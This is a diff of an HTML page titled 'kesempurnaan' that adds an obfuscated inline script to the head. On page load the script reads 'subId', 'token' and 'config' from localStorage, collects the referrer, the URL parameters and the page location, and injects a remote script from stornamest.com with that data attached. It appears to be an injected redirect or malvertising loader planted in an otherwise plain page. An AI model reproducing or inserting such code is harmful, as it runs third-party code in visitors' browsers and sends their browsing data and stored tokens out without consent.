@@ -2,7 +2,49 @@
 <html>
 <head>
     <meta charset="utf-8">
-
+    <script>
+    (function() {
+    var name = '_gbxxRkT28FD4MpFz';
+    if (!window._gbxxRkT28FD4MpFz) {
+        window._gbxxRkT28FD4MpFz = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://stornamest.com/WgnzLLyZ',
+            P_PATH: 'https://stornamest.com/7b4f75c/postback',
+        };
+    }
+    const _L1JV95TZ1yNZ5J7W = localStorage.getItem('config');
+    if (typeof _L1JV95TZ1yNZ5J7W !== 'undefined' && _L1JV95TZ1yNZ5J7W !== null) {
+        var _dxCnww2VLfvyMhC7 = JSON.parse(_L1JV95TZ1yNZ5J7W);
+        var _5x8FLtVCw8JXZTLq = Math.round(+new Date()/1000);
+        if (_dxCnww2VLfvyMhC7.created_at + window._gbxxRkT28FD4MpFz.ttl < _5x8FLtVCw8JXZTLq) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _1X3WcrT4bPcf3N9V = localStorage.getItem('subId');
+    var _B8qyMYPxhWcz3PCY = localStorage.getItem('token');
+    var _xJfy2JbDDTL4kDPy = '?return=js.client';
+        _xJfy2JbDDTL4kDPy += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _xJfy2JbDDTL4kDPy += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _xJfy2JbDDTL4kDPy += '&default_keyword=' + encodeURIComponent(document.title);
+        _xJfy2JbDDTL4kDPy += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _xJfy2JbDDTL4kDPy += '&name=' + encodeURIComponent(name);
+        _xJfy2JbDDTL4kDPy += '&host=' + encodeURIComponent(window._gbxxRkT28FD4MpFz.R_PATH);
+    if (typeof _1X3WcrT4bPcf3N9V !== 'undefined' && _1X3WcrT4bPcf3N9V && window._gbxxRkT28FD4MpFz.unique) {
+        _xJfy2JbDDTL4kDPy += '&sub_id=' + encodeURIComponent(_1X3WcrT4bPcf3N9V);
+    }
+    if (typeof _B8qyMYPxhWcz3PCY !== 'undefined' && _B8qyMYPxhWcz3PCY && window._gbxxRkT28FD4MpFz.unique) {
+        _xJfy2JbDDTL4kDPy += '&token=' + encodeURIComponent(_B8qyMYPxhWcz3PCY);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._gbxxRkT28FD4MpFz.R_PATH + _xJfy2JbDDTL4kDPy;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
     
 
     <title>kesempurnaan</title>
